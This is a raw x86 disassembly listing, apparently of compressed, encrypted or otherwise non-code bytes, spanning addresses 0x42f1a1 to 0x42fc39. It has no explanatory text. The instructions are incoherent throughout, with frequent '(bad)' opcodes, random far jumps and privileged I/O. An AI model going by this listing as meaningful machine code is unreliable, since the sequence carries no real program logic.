  42f1a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1a2:	aas    
  42f1a3:	and    BYTE PTR [esi+edx*8+0x21],bh
  42f1a7:	sbb    dh,ah
  42f1a9:	int3   
  42f1aa:	dec    BYTE PTR [edx+0x3b767b4a]
  42f1b0:	inc    edi
  42f1b1:	xor    DWORD PTR [eax-0x5f],edx
  42f1b4:	js     0x42f146
  42f1b6:	jns    0x42f1be
  42f1b8:	fidivr DWORD PTR [edi+0x3b5ea5b0]
  42f1be:	mov    eax,0xa2c212
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	adc    DWORD PTR [ebp-0xd635509],ecx
  42f246:	add    DWORD PTR [eax],eax
  42f248:	test   BYTE PTR [eax],0x0
  42f24b:	add    BYTE PTR [esi-0x6b528e0f],ch
  42f251:	ins    BYTE PTR es:[edi],dx
  42f252:	pop    ds
  42f253:	cmp    BYTE PTR [edi],bh
  42f255:	scas   eax,DWORD PTR es:[edi]
  42f256:	sub    ah,BYTE PTR [eax]
  42f258:	cdq    
  42f259:	push   ss
  42f25a:	add    DWORD PTR [eax-0x54c294b4],eax
  42f260:	fistp  WORD PTR [esi-0xf3398f9]
  42f266:	sub    dl,BYTE PTR [ecx]
  42f268:	jmp    0x42f221
  42f26a:	push   ecx
  42f26b:	jmp    0xcf174b11
  42f270:	xchg   edx,eax
  42f271:	call   0xa80adb04
  42f276:	jecxz  0x42f277
  42f278:	ja     0x42f20d
  42f27a:	(bad)  
  42f27b:	mov    edx,0x2678d1f8
  42f280:	scas   al,BYTE PTR es:[edi]
  42f281:	jecxz  0x42f283
  42f283:	lods   eax,DWORD PTR ds:[esi]
  42f284:	ins    DWORD PTR es:[edi],dx
  42f285:	cmp    eax,DWORD PTR [ebx+0x5a5e9b07]
  42f28b:	test   esi,0x70c7ffb5
  42f291:	sub    ch,ah
  42f293:	popa   
  42f294:	push   edx
  42f295:	scas   eax,DWORD PTR es:[edi]
  42f296:	loop   0x42f2b7
  42f298:	scas   eax,DWORD PTR es:[edi]
  42f299:	sbb    edx,ebp
  42f29b:	clc    
  42f29c:	xor    al,0xa
  42f29e:	or     ah,al
  42f2a0:	push   edi
  42f2a1:	jmp    0x80d2:0x33bbb6c0
  42f2a8:	xchg   edi,eax
  42f2a9:	shr    cl,1
  42f2ab:	xchg   ecx,eax
  42f2ac:	aas    
  42f2ad:	rcr    BYTE PTR [eax-0x45ccf80f],0xde
  42f2b4:	lock jns 0x42f297
  42f2b7:	jo     0x42f27e
  42f2b9:	xchg   edi,eax
  42f2ba:	adc    DWORD PTR [ebp+0xa066692],0x4b
  42f2c1:	jmp    0x31850594
  42f2c6:	push   0xf993c61d
  42f2cb:	push   ebp
  42f2cc:	cwde   
  42f2cd:	fsub   QWORD PTR [ecx+0x13daa537]
  42f2d3:	mov    cl,0xb1
  42f2d5:	push   0xffffffaf
  42f2d7:	cld    
  42f2d8:	xor    eax,0x6ebd6868
  42f2dd:	jecxz  0x42f2b2
  42f2df:	hlt    
  42f2e0:	dec    ebx
  42f2e1:	loopne 0x42f2e9
  42f2e3:	mov    BYTE PTR [ebx],bh
  42f2e5:	ret    
  42f2e6:	enter  0x9b8c,0xb9
  42f2ea:	dec    edi
  42f2eb:	pop    edx
  42f2ec:	mov    ebp,0xeca00f4f
  42f2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2f2:	sub    BYTE PTR [ecx-0x6d0c2ca4],0xbc
  42f2f9:	out    dx,al
  42f2fa:	icebp  
  42f2fb:	(bad)  
  42f2fc:	aaa    
  42f2fd:	ja     0x42f2b3
  42f2ff:	add    BYTE PTR [edx-0x41ec8ed4],dh
  42f305:	lea    ebx,[edi-0x6096561f]
  42f30b:	je     0x42f294
  42f30d:	sbb    BYTE PTR [ecx+0x6b52407c],0x1b
  42f314:	and    bh,dh
  42f316:	xor    al,0xba
  42f318:	cld    
  42f319:	dec    ecx
  42f31a:	ret    0x7631
  42f31d:	aad    0x5b
  42f31f:	push   edx
  42f320:	mov    ebp,0xca696ecd
  42f325:	imul   edi,DWORD PTR ds:0x79c07df0,0x7bd186e2
  42f32f:	(bad)  
  42f330:	cld    
  42f331:	cmp    BYTE PTR [ecx],dl
  42f333:	int3   
  42f334:	(bad)  
  42f335:	inc    DWORD PTR [ebx+0x571f5384]
  42f33b:	mov    ecx,DWORD PTR [ebx+esi*8-0x2a]
  42f33f:	mov    cl,0xd9
  42f341:	adc    DWORD PTR [eax],eax
	...
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3c1:	dec    ecx
  42f3c2:	sbb    eax,0x1f3925c
  42f3c7:	add    dh,dh
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [edx+0x14],ah
  42f3ce:	sahf   
  42f3cf:	push   edi
  42f3d0:	adc    DWORD PTR [eax-0xb575bf7],ebp
  42f3d6:	mov    ecx,0x6500f193
  42f3db:	ins    DWORD PTR es:[edi],dx
  42f3dc:	aam    0xf8
  42f3de:	je     0x42f442
  42f3e0:	or     edx,DWORD PTR [eax]
  42f3e2:	cmp    ch,BYTE PTR [edx]
  42f3e4:	push   edx
  42f3e5:	or     ch,BYTE PTR [ecx-0x40]
  42f3e8:	rcl    BYTE PTR [ecx],0x83
  42f3eb:	out    dx,eax
  42f3ec:	push   esi
  42f3ed:	lock add ebp,DWORD PTR [esi+0x57]
  42f3f1:	jg     0x42f41d
  42f3f3:	fcom   QWORD PTR [esi-0x1f]
  42f3f6:	fstp   DWORD PTR [edx+0x64fb6dca]
  42f3fc:	push   esi
  42f3fd:	imul   ecx,DWORD PTR [esi+0x77],0x5b
  42f401:	mov    DWORD PTR [edx],esi
  42f403:	mov    eax,ds:0xc72a6a94
  42f408:	out    dx,eax
  42f409:	mov    ebx,0x6e7a4bba
  42f40e:	mov    dh,0x8e
  42f410:	inc    ebp
  42f411:	es inc esp
  42f413:	stos   DWORD PTR es:[edi],eax
  42f414:	cmp    BYTE PTR [edi-0x2],ah
  42f417:	sub    esp,edx
  42f419:	inc    ecx
  42f41a:	xor    bh,BYTE PTR [esi]
  42f41c:	fnstenv [edi+0x6e838258]
  42f422:	mov    edi,0x2faa31a3
  42f427:	dec    edx
  42f428:	jns    0x42f3ee
  42f42a:	fwait
  42f42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f42c:	mov    ecx,0x96560e83
  42f431:	inc    esp
  42f432:	pop    ds
  42f433:	xor    al,0x6b
  42f435:	sub    bh,dl
  42f437:	out    0x22,al
  42f439:	and    eax,0xb71cc1bf
  42f43e:	and    DWORD PTR ds:0x333875c5,ecx
  42f444:	jno    0x42f466
  42f446:	mov    edx,0xed0487c4
  42f44b:	jecxz  0x42f4a8
  42f44d:	or     eax,0xb9bcf85e
  42f452:	mov    esi,DWORD PTR [eax+ecx*8-0x54]
  42f456:	xchg   DWORD PTR [edi-0x22],esi
  42f459:	inc    esp
  42f45a:	mov    cl,0xa6
  42f45c:	test   BYTE PTR [ebx-0x65],bl
  42f45f:	out    0x8f,eax
  42f461:	and    al,0x4a
  42f463:	or     bh,bl
  42f465:	clc    
  42f466:	ins    BYTE PTR es:[edi],dx
  42f467:	push   ss
  42f468:	shl    esi,0x58
  42f46b:	(bad)  
  42f46c:	outs   dx,BYTE PTR ds:[esi]
  42f46d:	cmp    al,0x9c
  42f46f:	out    dx,eax
  42f470:	unpcklps xmm7,XMMWORD PTR [edi-0x5a]
  42f474:	push   edx
  42f475:	adc    ebp,esp
  42f477:	inc    edi
  42f478:	dec    ebp
  42f479:	pop    edi
  42f47a:	adc    al,0x3c
  42f47c:	push   esp
  42f47d:	imul   esp,DWORD PTR [eax-0x7e1384da],0xffffff9b
  42f484:	mov    eax,0xcec9daf2
  42f489:	sub    cl,BYTE PTR [ebx]
  42f48b:	inc    ecx
  42f48c:	jmp    0x42f451
  42f48e:	test   DWORD PTR [ebp+0x1fa6828],ebx
  42f494:	xchg   ebx,eax
  42f495:	push   0xc2770d5e
  42f49a:	add    DWORD PTR [edi-0x16a091b1],ecx
  42f4a0:	pop    ebp
  42f4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4a2:	fst    QWORD PTR [edx+0x5]
  42f4a5:	daa    
  42f4a6:	fild   DWORD PTR [ebx-0x13]
  42f4a9:	inc    eax
  42f4aa:	shl    ch,cl
  42f4ac:	jbe    0x42f4e7
  42f4ae:	ja     0x42f51a
  42f4b0:	test   DWORD PTR [eax-0x64],esi
  42f4b3:	mov    ebp,0x9e461461
  42f4b8:	and    ecx,edx
  42f4ba:	push   esi
  42f4bb:	or     BYTE PTR [esi+edx*8],al
  42f4be:	cdq    
  42f4bf:	sbb    DWORD PTR ss:[edi],edx
	...
  42f532:	add    BYTE PTR [eax],al
  42f534:	push   ebp
  42f535:	cmp    dh,cl
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0x6b],bh
  42f541:	enter  0x3f3c,0x88
  42f545:	hlt    
  42f546:	add    DWORD PTR [eax],eax
  42f548:	test   BYTE PTR [eax],0x0
  42f54b:	add    BYTE PTR [edx],al
  42f54d:	adc    al,0xb
  42f54f:	push   cs
  42f550:	sbb    al,0x49
  42f552:	and    eax,0xd383e192
  42f557:	sbb    al,0x1e
  42f559:	ror    BYTE PTR [ecx-0x58],cl
  42f55c:	xor    BYTE PTR [ebp-0x10],bl
  42f55f:	inc    ecx
  42f560:	mov    DWORD PTR [ebx-0x1],eax
  42f563:	and    DWORD PTR [esi],ecx
  42f565:	jmp    0x42f56d
  42f567:	xchg   ebx,eax
  42f568:	pushf  
  42f569:	iret   
  42f56a:	xor    DWORD PTR fs:[ebp+edx*1+0x43],edi
  42f56f:	lods   al,BYTE PTR ds:[esi]
  42f570:	jbe    0x42f544
  42f572:	(bad)  
  42f576:	mov    dh,cl
  42f578:	imul   eax,DWORD PTR ds:0xca5078ba,0x993d8c82
  42f582:	mov    ch,0xd2
  42f584:	ja     0x42f539
  42f586:	xchg   esp,eax
  42f587:	mov    ah,0x5c
  42f589:	rol    cl,0x79
  42f58c:	lahf   
  42f58d:	sbb    eax,0x8fc3ffce
  42f592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f593:	jmp    0x42f556
  42f595:	push   ecx
  42f596:	out    dx,al
  42f597:	add    esi,DWORD PTR [esi]
  42f599:	stos   BYTE PTR es:[edi],al
  42f59a:	ss clc 
  42f59c:	nop
  42f59d:	pop    ebx
  42f59e:	sub    eax,0x28d373c8
  42f5a3:	add    eax,0xaea86125
  42f5a8:	sbb    eax,0x71211d58
  42f5ad:	mov    al,0xc6
  42f5af:	and    DWORD PTR ds:0xd5e29e1d,edi
  42f5b5:	stos   DWORD PTR es:[edi],eax
  42f5b6:	out    0x78,al
  42f5b8:	and    DWORD PTR [edx],esi
  42f5ba:	retf   
  42f5bb:	jp     0x42f59f
  42f5bd:	pushf  
  42f5be:	imul   ecx,DWORD PTR [ebp-0x6263838f],0xffffffab
  42f5c5:	sbb    ch,BYTE PTR ds:0x9dbe6db7
  42f5cb:	fisub  WORD PTR ss:[ecx+0x4f]
  42f5cf:	lea    eax,[ebx-0x42a70eab]
  42f5d5:	test   al,0x15
  42f5d7:	ret    0xc4de
  42f5da:	inc    ebx
  42f5db:	push   edi
  42f5dc:	ss push 0x63
  42f5df:	push   eax
  42f5e0:	loope  0x42f5ad
  42f5e2:	push   ds
  42f5e3:	imul   ecx,DWORD PTR [ecx-0x1],0x5b595cc7
  42f5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5eb:	add    BYTE PTR [edx-0x52],dl
  42f5ee:	ins    DWORD PTR es:[edi],dx
  42f5ef:	mov    ebx,0x5e361f0b
  42f5f4:	mov    eax,ds:0xacd64771
  42f5f9:	sbb    DWORD PTR [ecx+0xe],edi
  42f5fc:	or     al,0x5c
  42f5fe:	mov    bh,0xa
  42f600:	test   al,0xdb
  42f602:	add    dh,dl
  42f604:	inc    esi
  42f605:	xchg   ecx,eax
  42f606:	push   edi
  42f607:	mov    DWORD PTR [eax-0x33dc3f90],edi
  42f60d:	push   es
  42f60e:	and    BYTE PTR [ecx+0x716abbb5],0xee
  42f615:	ret    0x6fd0
  42f618:	inc    bp
  42f61a:	mov    DWORD PTR [ecx+eax*4+0x3f59de5a],eax
  42f621:	cdq    
  42f622:	push   esp
  42f623:	add    al,0x16
  42f625:	sbb    BYTE PTR [ebp-0x42],dl
  42f628:	adc    ch,cl
  42f62a:	pop    ebp
  42f62b:	pop    ecx
  42f62c:	pop    eax
  42f62d:	loopne 0x42f64f
  42f62f:	retf   0x908d
  42f632:	or     esp,eax
  42f634:	mov    BYTE PTR [edx-0x65],0x86
  42f638:	bound  esp,QWORD PTR [ecx+0x72c6a1eb]
  42f63e:	adc    bl,cl
  42f640:	pop    ecx
  42f641:	jmp    0x42f646
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    ch,BYTE PTR [esi]
  42f6c1:	xchg   edi,eax
  42f6c2:	inc    esp
  42f6c3:	xchg   edx,eax
  42f6c4:	jle    0x42f6bb
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	test   BYTE PTR [eax],0x0
  42f6cb:	add    BYTE PTR [ebp+0x4851b85c],ah
  42f6d1:	xor    eax,0x21894659
  42f6d6:	cdq    
  42f6d7:	(bad)  
  42f6d8:	and    ah,BYTE PTR [ecx-0x1e]
  42f6db:	sbb    al,0xfa
  42f6dd:	mov    ebx,0xbeeb2058
  42f6e2:	mov    esi,0x3df368b7
  42f6e7:	aam    0x9b
  42f6e9:	jno    0x42f695
  42f6eb:	aas    
  42f6ec:	icebp  
  42f6ed:	mov    DWORD PTR [ecx+edi*2],edx
  42f6f0:	es jp  0x42f712
  42f6f3:	inc    edx
  42f6f4:	xor    ebx,DWORD PTR [edx]
  42f6f6:	dec    esi
  42f6f7:	inc    eax
  42f6f8:	cmp    BYTE PTR [ebx+0x79],ch
  42f6fb:	add    ch,BYTE PTR [edx]
  42f6fd:	sar    ch,cl
  42f6ff:	jne    0x42f757
  42f701:	push   0x8bfd1b3e
  42f706:	(bad)  
  42f707:	jmp    0x57316bda
  42f70c:	outs   dx,BYTE PTR ds:[esi]
  42f70d:	add    BYTE PTR [edi+0x117bcb30],cl
  42f713:	aad    0xe0
  42f715:	xchg   ecx,eax
  42f716:	inc    ebp
  42f717:	mov    ebx,0xd2da6ead
  42f71c:	sbb    al,0x21
  42f71e:	jle    0x42f709
  42f720:	push   ss
  42f721:	mov    esi,cs
  42f723:	xor    ah,BYTE PTR [ecx+eax*4]
  42f726:	xchg   ah,bh
  42f728:	dec    eax
  42f729:	add    BYTE PTR [ebx*1-0x741585de],0xd3
  42f731:	or     DWORD PTR [ecx+0x1e],ebp
  42f734:	dec    ecx
  42f735:	popa   
  42f736:	loop   0x42f74d
  42f738:	pop    esp
  42f739:	mov    edx,DWORD PTR [edx-0x40ccc0c8]
  42f73f:	pop    eax
  42f740:	jecxz  0x42f6c9
  42f742:	data16 test BYTE PTR es:[edx+0x4a],ch
  42f747:	pop    edi
  42f748:	push   edx
  42f749:	cld    
  42f74a:	jne    0x42f6e5
  42f74c:	cmp    al,0x34
  42f74e:	out    dx,al
  42f74f:	ja     0x42f70c
  42f751:	sub    al,0x68
  42f753:	out    dx,eax
  42f754:	cmp    ah,BYTE PTR [edi-0xb91b576]
  42f75a:	xor    edi,eax
  42f75c:	fst    st(7)
  42f75e:	mov    ebx,0x10af8649
  42f763:	mov    dl,0xf7
  42f765:	adc    DWORD PTR ds:0x3b45a348,esp
  42f76b:	rol    BYTE PTR [edi-0x2],1
  42f76e:	cmp    al,0x38
  42f770:	xchg   esi,eax
  42f771:	retf   
  42f772:	push   eax
  42f773:	ror    bh,0x2
  42f776:	scas   al,BYTE PTR es:[edi]
  42f777:	rcr    DWORD PTR [ecx-0x432583b6],1
  42f77d:	xchg   ebx,eax
  42f77e:	mov    esi,0xfb2748b8
  42f783:	add    eax,0x2cb6cf61
  42f788:	dec    eax
  42f789:	cs lahf 
  42f78b:	or     ch,BYTE PTR [esi-0x7a06c13b]
  42f791:	les    esp,FWORD PTR [edi]
  42f793:	pop    edi
  42f794:	aas    
  42f795:	cmp    cl,BYTE PTR [ebp+0x21873bc]
  42f79b:	mov    edi,0x9a7f9a7d
  42f7a0:	dec    esp
  42f7a1:	sbb    dh,BYTE PTR [eax-0x4006c5d1]
  42f7a7:	ja     0x42f78a
  42f7a9:	out    dx,eax
  42f7aa:	jo     0x42f730
  42f7ac:	into   
  42f7ad:	aaa    
  42f7ae:	pop    esi
  42f7af:	fcomp  DWORD PTR [ecx+0x10fb10b3]
  42f7b5:	xchg   edi,eax
  42f7b6:	add    dh,bl
  42f7b8:	xchg   edi,eax
  42f7b9:	rep lods al,BYTE PTR ds:[esi]
  42f7bb:	dec    ebp
  42f7bc:	mov    ch,0x1c
  42f7be:	xor    esp,ebx
  42f7c0:	out    0x26,eax
	...
  42f832:	add    BYTE PTR [eax],al
  42f834:	ret    
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x37af3771]
  42f841:	mov    BYTE PTR [edx+0x1f6746c],dh
  42f847:	add    dh,dh
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    bl,bl
  42f84d:	and    BYTE PTR [edx-0x34b80677],0x3a
  42f854:	sbb    BYTE PTR [edx],bl
  42f856:	adc    DWORD PTR [eax-0x53],esi
  42f859:	test   BYTE PTR [edi],dh
  42f85b:	adc    eax,esi
  42f85d:	push   ds
  42f85e:	dec    edi
  42f85f:	sar    DWORD PTR [ebp+0x2ef3db91],cl
  42f865:	mov    ah,0x6f
  42f867:	inc    ecx
  42f868:	and    BYTE PTR [eax-0x60b23e0f],dl
  42f86e:	cli    
  42f86f:	stos   DWORD PTR es:[edi],eax
  42f870:	ret    0xc3d5
  42f873:	mov    BYTE PTR ds:0x670db86b,ah
  42f879:	hlt    
  42f87a:	mov    bl,0x91
  42f87c:	lods   al,BYTE PTR ds:[esi]
  42f87d:	jo     0x42f8dc
  42f87f:	pop    edi
  42f880:	jo     0x42f810
  42f882:	(bad)  
  42f883:	xchg   esi,eax
  42f884:	xor    eax,0xb2617884
  42f889:	cli    
  42f88a:	sbb    dl,dh
  42f88c:	xor    eax,DWORD PTR [esi-0x56]
  42f88f:	mov    bl,0x39
  42f891:	vcmpps ymm0,ymm7,YMMWORD PTR [ecx-0x6132b0a9],0x56
  42f89a:	outs   dx,BYTE PTR ds:[esi]
  42f89b:	in     al,0x51
  42f89d:	xor    eax,0xf50dd2fb
  42f8a2:	jmp    FWORD PTR [edi-0x99114bb]
  42f8a8:	imul   ecx,ecx,0x5e1b383c
  42f8ae:	std    
  42f8af:	jg     0x42f8cf
  42f8b1:	popa   
  42f8b2:	mov    al,0xc9
  42f8b4:	add    ecx,DWORD PTR ds:0x7675279d
  42f8ba:	add    edi,ebp
  42f8bc:	mov    dh,0x5b
  42f8be:	ret    
  42f8bf:	inc    ebx
  42f8c0:	mov    ss,WORD PTR [ecx-0x79]
  42f8c3:	mov    ah,0xfc
  42f8c5:	test   al,0x23
  42f8c7:	ins    DWORD PTR es:[edi],dx
  42f8c8:	dec    eax
  42f8c9:	js     0x42f85a
  42f8cb:	retf   0x43a6
  42f8ce:	or     al,0x42
  42f8d0:	aas    
  42f8d1:	inc    ebp
  42f8d2:	or     cl,BYTE PTR [ecx-0x36]
  42f8d5:	aaa    
  42f8d6:	sub    DWORD PTR [esi-0x6bb02a1c],0x1279deda
  42f8e0:	sar    BYTE PTR [eax-0x24],0xc9
  42f8e4:	sub    DWORD PTR [edi+0x2ee8f30e],ecx
  42f8ea:	pop    edi
  42f8eb:	add    ebx,0xffffffea
  42f8ee:	stos   DWORD PTR es:[edi],eax
  42f8ef:	lock sbb edi,DWORD PTR [bx+di]
  42f8f3:	fdiv   DWORD PTR [ebx]
  42f8f5:	xor    eax,0x514c6d20
  42f8fa:	add    BYTE PTR [eax*4+0x5039a81e],ah
  42f901:	xor    DWORD PTR [eax+0x35cdc60f],esi
  42f907:	sub    al,0x4c
  42f909:	push   edi
  42f90a:	fistp  QWORD PTR [edx+0x23]
  42f90d:	or     BYTE PTR [esi+0x68fbe004],dl
  42f913:	sti    
  42f914:	out    dx,eax
  42f915:	loopne 0x42f971
  42f917:	fisub  DWORD PTR [ebx]
  42f919:	(bad)  
  42f91a:	inc    DWORD PTR ds:0x67f23b24
  42f920:	sbb    DWORD PTR ds:0xb5344348,ebx
  42f926:	ret    
  42f927:	cld    
  42f928:	call   0x6948:0xf4e5304c
  42f92f:	add    al,0xd9
  42f931:	sbb    eax,0x155fdd9f
  42f936:	lods   eax,DWORD PTR ds:[esi]
  42f937:	jne    0x42f8fa
  42f939:	mov    al,0x31
  42f93b:	lahf   
  42f93c:	xor    DWORD PTR [eax+esi*8-0x60],0xa483
	...
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	mov    dl,0x11
  42f9c2:	and    edi,DWORD PTR [eax+0x6a]
  42f9c5:	test   DWORD PTR [ecx],0xf600
  42f9cb:	add    BYTE PTR [edi+0x70302c30],ah
  42f9d1:	add    eax,0xb68b974c
  42f9d6:	and    bl,bh
  42f9d8:	and    eax,0x87791cc5
  42f9dd:	inc    esi
  42f9de:	dec    edi
  42f9df:	call   0x59ee1bc2
  42f9e4:	mov    edi,0x11646375
  42f9e9:	mov    bl,BYTE PTR [edi+0x29]
  42f9ec:	popf   
  42f9ed:	test   BYTE PTR [esi-0x51db59c4],dh
  42f9f3:	add    ah,BYTE PTR [ebx+ebp*4]
  42f9f6:	mov    DWORD PTR ds:0x7a17ecc5,0x855fe61f
  42fa00:	pop    edx
  42fa01:	leave  
  42fa02:	outs   dx,BYTE PTR ds:[esi]
  42fa03:	mov    ds:0x1c408c80,eax
  42fa08:	scas   al,BYTE PTR es:[edi]
  42fa09:	xor    BYTE PTR [ebp+edi*4-0x37],ah
  42fa0d:	cmp    dh,BYTE PTR [ebp+0x25]
  42fa10:	in     eax,dx
  42fa11:	and    DWORD PTR [ebx-0x59dc9302],0xae0d0161
  42fa1b:	mov    dl,0x1e
  42fa1d:	mov    esi,0x5ffc6611
  42fa22:	hlt    
  42fa23:	xchg   ecx,eax
  42fa24:	sbb    al,0x95
  42fa26:	adc    bh,BYTE PTR [ebp-0x3e4a102a]
  42fa2c:	fadd   QWORD PTR [edx-0x6e2431ec]
  42fa32:	push   ss
  42fa33:	pop    ebx
  42fa34:	adc    eax,0x1bcb4b9
  42fa39:	dec    esi
  42fa3a:	lahf   
  42fa3b:	adc    DWORD PTR [ecx+0x7a3e2aab],0x98acecda
  42fa45:	ret    
  42fa46:	bound  esi,QWORD PTR [ebp-0x19ab6096]
  42fa4c:	jbe    0x42fa0d
  42fa4e:	adc    al,0x4f
  42fa50:	jl     0x42fa4b
  42fa52:	push   edx
  42fa53:	enter  0x6a6e,0x61
  42fa57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa58:	popa   
  42fa59:	xor    ebx,ebp
  42fa5b:	ins    DWORD PTR es:[edi],dx
  42fa5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa5d:	inc    edi
  42fa5e:	aad    0xf3
  42fa60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa61:	or     eax,0xf1c1134e
  42fa66:	mov    cl,BYTE PTR [eax-0x41]
  42fa69:	sub    eax,0x620df339
  42fa6e:	jb     0x42fa38
  42fa70:	push   eax
  42fa71:	sahf   
  42fa72:	add    eax,ecx
  42fa74:	sub    eax,0x13692191
  42fa79:	jmp    DWORD PTR [eax-0x75]
  42fa7c:	ins    BYTE PTR es:[edi],dx
  42fa7d:	push   ds
  42fa7e:	cmc    
  42fa7f:	jno    0x42faf3
  42fa81:	fidivr WORD PTR [edx+eax*1-0x529ea6d7]
  42fa88:	push   cs
  42fa89:	dec    edx
  42fa8a:	sub    edx,0xffffff85
  42fa8d:	sbb    ecx,DWORD PTR [edx]
  42fa8f:	mov    al,ds:0x23201a1
  42fa94:	jg     0x42fac3
  42fa96:	mov    edx,0xe96451eb
  42fa9b:	cld    
  42fa9c:	mov    bh,0xcb
  42fa9e:	xor    edx,ebp
  42faa0:	cmc    
  42faa1:	jl     0x42faff
  42faa3:	test   esp,0xc207b01a
  42faa9:	or     eax,0xb67ee20a
  42faae:	outs   dx,DWORD PTR ds:[esi]
  42faaf:	pop    eax
  42fab0:	ficom  WORD PTR [edx+0x9494beb]
  42fab6:	loop   0x42faf6
  42fab8:	adc    eax,0x6da72dbf
  42fabd:	sub    edx,esi
  42fabf:	test   al,0xbf
  42fac1:	inc    ebp
	...
  42fb32:	add    BYTE PTR [eax],al
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	ret    0xe3f4
  42fb43:	inc    ebx
  42fb44:	pusha  
  42fb45:	clc    
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    BYTE PTR [edx],bl
  42fb4d:	mov    eax,0x9b9d0b49
  42fb52:	data16 add cl,ah
  42fb55:	test   dl,0x9
  42fb58:	aam    0x94
  42fb5a:	xchg   ebx,eax
  42fb5b:	lahf   
  42fb5c:	test   al,0x3
  42fb5e:	add    ebx,DWORD PTR [edx+edx*4-0x10b8b498]
  42fb65:	leave  
  42fb66:	jno    0x42fb07
  42fb68:	(bad)  
  42fb6c:	sbb    bl,0xfe
  42fb6f:	out    dx,al
  42fb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb71:	push   cs
  42fb72:	jne    0x42fbf2
  42fb74:	pop    es
  42fb75:	push   esi
  42fb76:	xor    DWORD PTR [ebx-0x51180f87],edx
  42fb7c:	mov    bl,0x51
  42fb7e:	cs loope 0x42fbdd
  42fb81:	sub    al,dh
  42fb83:	or     edi,eax
  42fb85:	push   ss
  42fb86:	inc    ebx
  42fb87:	push   0x6b3d9002
  42fb8c:	out    dx,eax
  42fb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb8e:	jp     0x42fb5e
  42fb90:	or     BYTE PTR [ecx+0x78a18972],al
  42fb96:	push   esp
  42fb97:	sub    BYTE PTR [ebp-0x44],dh
  42fb9a:	mov    ah,0xad
  42fb9c:	hlt    
  42fb9d:	mov    edx,0x2d6ba2cb
  42fba2:	xor    edi,DWORD PTR [ebx-0x47]
  42fba5:	std    
  42fba6:	push   0xffffffa8
  42fba8:	loope  0x42fb5d
  42fbaa:	mov    bl,0xdd
  42fbac:	pop    ebp
  42fbad:	jmp    0x9c18:0x41207c32
  42fbb4:	xor    eax,0xfef92dad
  42fbb9:	mov    esi,0x7f0bcf66
  42fbbe:	bound  esp,QWORD PTR [ebx+0x4aca7c5]
  42fbc4:	inc    esp
  42fbc5:	push   es
  42fbc6:	lahf   
  42fbc7:	sub    DWORD PTR [eax],esi
  42fbc9:	or     al,0x14
  42fbcb:	cmp    ch,BYTE PTR [ebx-0x34]
  42fbce:	mov    bl,0x5e
  42fbd0:	ret    0x1bbc
  42fbd3:	jmp    0x2b88:0x2a1b98b9
  42fbda:	(bad)  
  42fbdc:	mov    edx,0x4ecd8a3c
  42fbe1:	imul   esp,DWORD PTR [ecx+0x5c],0x4a
  42fbe5:	jl     0x42fba6
  42fbe7:	iret   
  42fbe8:	aas    
  42fbe9:	xchg   ebx,eax
  42fbea:	mov    eax,ds:0xef8c4261
  42fbef:	inc    eax
  42fbf0:	cdq    
  42fbf1:	xlat   BYTE PTR ds:[ebx]
  42fbf2:	mov    edi,0xfd4277b7
  42fbf7:	pushf  
  42fbf8:	mov    ?,WORD PTR [edi]
  42fbfa:	clc    
  42fbfb:	aam    0xf4
  42fbfd:	dec    ebp
  42fbfe:	push   esp
  42fbff:	imul   esi,DWORD PTR [ebx],0x55
  42fc02:	in     eax,dx
  42fc03:	jae    0x42fc6c
  42fc05:	jo     0x42fc3b
  42fc07:	out    dx,al
  42fc08:	rcl    al,0x50
  42fc0b:	nop
  42fc0c:	inc    ebp
  42fc0d:	scas   al,BYTE PTR es:[edi]
  42fc0e:	loope  0x42fc0d
  42fc10:	xor    bl,dh
  42fc12:	or     BYTE PTR [edi-0x79],bl
  42fc15:	sbb    DWORD PTR [edx+0x60a2adf3],ebx
  42fc1b:	sbb    eax,0x710ba20e
  42fc20:	or     ecx,DWORD PTR [eax]
  42fc22:	loope  0x42fc50
  42fc24:	add    dl,BYTE PTR ds:0xc9f8ce18
  42fc2a:	adc    BYTE PTR [eiz*8+0x2c81582e],ah
  42fc31:	cld    
  42fc32:	ja     0x42fc8e
  42fc34:	adc    eax,0x201f71e2
  42fc39:	daa    
